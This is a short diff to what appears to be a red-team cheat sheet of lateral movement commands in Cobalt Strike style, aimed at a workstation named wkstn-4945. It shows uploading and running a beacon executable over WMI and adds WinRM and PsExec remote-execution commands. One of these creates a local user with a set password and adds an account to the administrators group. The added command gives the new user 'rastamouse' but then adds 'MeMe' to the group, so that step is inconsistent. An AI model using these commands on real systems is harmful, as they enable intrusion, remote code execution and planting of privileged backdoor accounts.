@@ -40,3 +40,14 @@ upload C:\payloads\tcp-beacon.exe (\\wkstn-4945\c$\Windows\Temp\tcp-beacon.exe)
 remote-exec wmi wkstn-4945 C:\Windows\Temp\tcp-beacon.exe
 connect wkstn-4945 1337
 ```
+### PowerShell Remoting
+```
+jump winrm64 wkstn-4945 tcp
+remote-exec winrm wkstn-4945 whoami; hostname
+
+```
+### PsExec
+```
+remote-exec psexec wkstn-4945 cmd.exe /c "net user rastamouse Passw0rd! /add && net localgroup administrators MeMe /add"
+remote-exec winrm wkstn-4945 net localgroup administrators
+```
